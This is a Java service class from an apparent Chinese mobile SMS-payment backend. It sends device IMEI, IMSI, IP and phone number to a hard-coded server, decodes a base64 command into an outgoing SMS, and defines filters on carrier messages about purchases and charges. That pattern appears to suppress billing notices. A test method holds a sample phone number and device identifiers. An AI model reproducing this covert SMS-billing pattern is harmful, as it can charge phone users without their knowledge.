package com.jxt.pay.appclient.service.dynamic.net;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.HashMap;
import java.util.Map;

import org.apache.log4j.Logger;







import org.json.JSONArray;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.Constants;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.PostData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;

/**
 * 对接南京网游
 * @author leoliu
 *
 */
public class OpHftDynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(OpHftDynamicService.class);
	
	private static final String FIRSTREQUESTMODEL = "pid={pid}&imsi={imsi}&imei={imei}&ip={ip}&num={num}";
	
	private static final Guard guard1 = new Guard("10658099","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658099","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	private static final String TYPE = "ophft";//欧朋小额话费通2/10
		
	@Override
	public String dynamic(Map<String, String> map) {
		
		
		
		String url = map.get("url");
		String xml = null;
		
		if(url != null && url.length() > 0){
			String pid = map.get("pid");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			String ip = map.get(Constants.IPPARAM);
			String num =map.get("num");
			String param = FIRSTREQUESTMODEL.replace("{pid}", pid).replace("{imei}", imei).replace("{imsi}", imsi).replace("{ip}", ip).replace("{num}", num);
			
			logger.info("firstDynamic : "+param);
				
			String responseJson = GetData.getData(url,param);
				
			xml = parseFirst(responseJson);
			
		}
		
		if(xml == null){
			xml = DynamicUtils.parseError("598");//获取失败
		}
		
		return xml;
	}

	private String parseFirst(String responseJson){
		if(responseJson != null && responseJson.length() > 0){
			try{
				int pos = responseJson.indexOf("{");
			
				if(pos > 0){
					responseJson = responseJson.substring(pos);
				}
				
				JSONObject jo = new JSONObject(responseJson);
				
				
					String state = jo.getString("state");
					
					logger.info("parse first result code : "+state);
					
					if("0".equals(state)){
						
						
						
						JSONArray array = new JSONArray();
						
						String type = jo.getString("type");
						
						if("0".equals(type)){
							
							
							String cmd = jo.getString("cmd");
							String port = jo.getString("port");
							
							String smsContent;
							try {
								smsContent = CommonUtil.base64Decode(cmd);					
								
								Sms sms = new Sms();
								sms.setSmsDest(port);
								sms.setSmsContent(smsContent);
								sms.setSuccessTimeOut(2);
								
								return XstreamHelper.toXml(sms).toString();
							} catch (UnsupportedEncodingException e) {
								// TODO 自动生成的 catch 块
								e.printStackTrace();
							} catch (IOException e) {
								// TODO 自动生成的 catch 块
								e.printStackTrace();
							}
						
						
					}else{
						return DynamicUtils.parseError(state);
					}
				}
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}

	
	
	
	@Override
	public String getType() {
		return TYPE;
	}
	
	public static void main(String[] args){
	
		Map<String, String> map = new HashMap<String, String>();
		map.put("url","http://120.25.231.132:30080/api/getcmd");
		map.put("type","ophft");
		map.put("pid","10HH");
		map.put("imei","867376023133651");
		map.put("imsi","460001123143655");
		map.put(Constants.IPPARAM, "123.113.108.47");
		map.put("num", "18801032292");
		
		System.out.println(new OpHftDynamicService().dynamic(map));
	}
	
	
}
